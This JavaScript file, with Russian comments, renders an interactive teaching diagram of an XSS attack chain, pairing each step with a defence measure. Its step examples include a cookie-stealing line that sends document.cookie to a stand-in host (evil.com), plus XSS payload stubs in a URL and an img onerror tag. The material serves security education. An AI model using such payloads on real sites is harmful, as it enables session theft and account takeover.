/**
 * Интерактивная схема kill chain XSS
 */
(function () {
  const STEPS = [
    {
      id: 'link',
      icon: '🔗',
      title: 'Вредоносная ссылка',
      short: 'Жертва открывает URL',
      detail:
        'Злоумышленник отправляет ссылку (email, мессенджер, QR). В параметре URL или hash спрятан XSS-payload. Для жертвы домен выглядит доверенным.',
      example: 'https://bank.example/search?q=<script>…</script>',
      vector: 'reflected.html',
      defense: 'Не переходить по подозрительным ссылкам; обучение пользователей.',
    },
    {
      id: 'reflect',
      icon: '🔄',
      title: 'Отражение в странице',
      short: 'Сервер или DOM вставляет payload',
      detail:
        'Reflected XSS: сервер отражает параметр в HTML без экранирования. DOM XSS: скрипт на клиенте читает location и пишет в innerHTML. Браузер получает страницу с исполняемым кодом от «своего» сайта.',
      example: 'Страница: «Вы искали: <img src=x onerror=…>»',
      vector: 'reflected.html',
      defense: 'Output encoding, textContent вместо innerHTML, валидация ввода.',
    },
    {
      id: 'cookie',
      icon: '🍪',
      title: 'Кража сессии',
      short: 'document.cookie → злоумышленник',
      detail:
        'Скрипт читает cookie (если нет HttpOnly) или токены в localStorage и отправляет на сервер атакующего через fetch/Image beacon. Сессия жертвы переходит к злоумышленнику.',
      example: 'fetch("https://evil.com/?c="+document.cookie)',
      vector: 'vectors.html',
      defense: 'HttpOnly + Secure + SameSite; не хранить секреты в localStorage.',
    },
    {
      id: 'action',
      icon: '⚡',
      title: 'Действия от имени жертвы',
      short: 'Запросы с cookie жертвы',
      detail:
        'С тем же cookie браузер выполняет запросы к API сайта: смена email, перевод, публикация поста, админ-действия. Пользователь может не заметить атаку.',
      example: 'POST /api/transfer с телом, созданным XSS-скриптом',
      vector: 'vectors.html',
      defense: 'CSP, CSRF-токены, SameSite, повторная аутентификация для критичных операций.',
    },
  ];

  let activeIndex = 0;

  function el(tag, className, text) {
    const node = document.createElement(tag);
    if (className) node.className = className;
    if (text != null) node.textContent = text;
    return node;
  }

  function mount(root) {
    if (!root) return;

    const track = el('div', 'kill-chain-track');
    const detailPanel = el('div', 'kill-chain-detail card-glass rounded-3xl p-6 md:p-8 border border-red-500/20 min-w-0');
    const progress = el('div', 'kill-chain-progress flex flex-wrap gap-2 justify-center mb-6');

    STEPS.forEach((step, index) => {
      const btn = el('button', 'kill-chain-step');
      btn.type = 'button';
      btn.dataset.index = String(index);
      btn.setAttribute('aria-pressed', index === 0 ? 'true' : 'false');

      const icon = el('span', 'kill-chain-step-icon', step.icon);
      const title = el('span', 'kill-chain-step-title', step.title);
      const short = el('span', 'kill-chain-step-short', step.short);
      btn.append(icon, title, short);

      if (index < STEPS.length - 1) {
        const arrow = el('span', 'kill-chain-arrow', '→');
        track.append(btn, arrow);
      } else {
        track.append(btn);
      }

      btn.addEventListener('click', () => setActive(index, detailPanel, progress));
      progress.append(
        (() => {
          const dot = el('button', 'kill-chain-dot');
          dot.type = 'button';
          dot.title = step.title;
          dot.textContent = String(index + 1);
          dot.addEventListener('click', () => setActive(index, detailPanel, progress));
          return dot;
        })()
      );
    });

    const nav = el('div', 'kill-chain-nav flex flex-wrap gap-3 justify-between mt-4');
    const prev = el('button', 'kill-chain-nav-btn', '← Назад');
    const next = el('button', 'kill-chain-nav-btn', 'Далее →');
    prev.type = 'button';
    next.type = 'button';
    prev.addEventListener('click', () => setActive(Math.max(0, activeIndex - 1), detailPanel, progress));
    next.addEventListener('click', () =>
      setActive(Math.min(STEPS.length - 1, activeIndex + 1), detailPanel, progress)
    );
    nav.append(prev, next);

    root.append(track, progress, detailPanel, nav);
    setActive(0, detailPanel, progress);
  }

  function setActive(index, detailPanel, progress) {
    activeIndex = index;
    const step = STEPS[index];

    document.querySelectorAll('.kill-chain-step').forEach((btn, i) => {
      btn.classList.toggle('is-active', i === index);
      btn.setAttribute('aria-pressed', i === index ? 'true' : 'false');
    });
    document.querySelectorAll('.kill-chain-dot').forEach((dot, i) => {
      dot.classList.toggle('is-active', i === index);
    });

    detailPanel.replaceChildren();

    const head = el('div', 'flex flex-wrap items-center gap-3 mb-4 min-w-0');
    head.append(el('span', 'text-3xl shrink-0', step.icon));
    const h = el('h2', 'text-2xl md:text-3xl font-bold text-red-300 break-words', step.title);
    head.append(h);
    detailPanel.append(head);

    detailPanel.append(el('p', 'text-gray-300 leading-8 mb-4', step.detail));

    const exLabel = el('p', 'text-xs uppercase tracking-widest text-gray-500 mb-1', 'Пример');
    const ex = el('pre', 'kill-chain-code bg-black/50 p-4 rounded-xl text-green-400 text-sm overflow-x-auto mb-4');
    ex.textContent = step.example;
    detailPanel.append(exLabel, ex);

    const links = el('div', 'flex flex-wrap gap-3 text-sm');
    const v = el('a', 'text-cyan-400 hover:underline');
    v.href = step.vector;
    v.textContent = 'Связанные векторы →';
    const p = el('a', 'text-green-400 hover:underline');
    p.href = 'protection.html';
    p.textContent = 'Как защититься →';
    links.append(v, p);
    detailPanel.append(links);

    const def = el('div', 'mt-4 p-4 rounded-xl bg-green-500/10 border border-green-500/30');
    def.append(el('p', 'text-green-300 font-semibold mb-1', '🛡️ Мера защиты'));
    def.append(el('p', 'text-gray-300 text-sm leading-7', step.defense));
    detailPanel.append(def);
  }

  document.addEventListener('DOMContentLoaded', () => {
    mount(document.getElementById('kill-chain-root'));
  });
})();
